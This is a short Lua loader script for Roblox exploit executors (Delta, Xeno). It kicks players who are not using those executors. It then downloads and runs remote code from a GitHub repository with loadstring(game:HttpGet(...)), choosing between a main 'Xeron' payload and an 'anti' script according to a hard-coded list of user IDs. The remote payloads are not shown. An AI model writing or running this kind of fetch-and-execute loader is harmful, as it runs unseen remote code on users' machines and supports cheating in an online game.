
local function verify()
    local env = getgenv()
    local isDelta = env.Delta ~= nil or env.is_delta ~= nil
    local isXeno = env.Xeno ~= nil or env.is_xeno ~= nil
    
    if not (isDelta or isXeno) then
        game.Players.LocalPlayer:Kick("지원하지 않는 환경입니다.")
    end
end

verify()

loadstring(game:HttpGet("https://raw.githubusercontent.com/qwer123476/Xeron/main/ppt"))()
local Players = game:GetService("Players")
local lp = Players.LocalPlayer

local whitelist = {
    [4396960314]=true,
    [10472996475]=true,
    [2932138780]=true,
    [10854413652]=true,
    [2432461669]=true
}

local function secureCheck()
    if not lp or not lp.UserId then return false end
    if not whitelist[lp.UserId] then return false end
    if tostring(lp.UserId):len() < 5 then return false end
    return true
end

if secureCheck() then
    task.spawn(function()
        pcall(function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/qwer123476/Xeron/main/Xeron.txt"))()

        end)
    end)
else
    task.spawn(function()
        pcall(function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/qwer123476/Xeron/main/anti"))()
        end)
    end)
    return
end
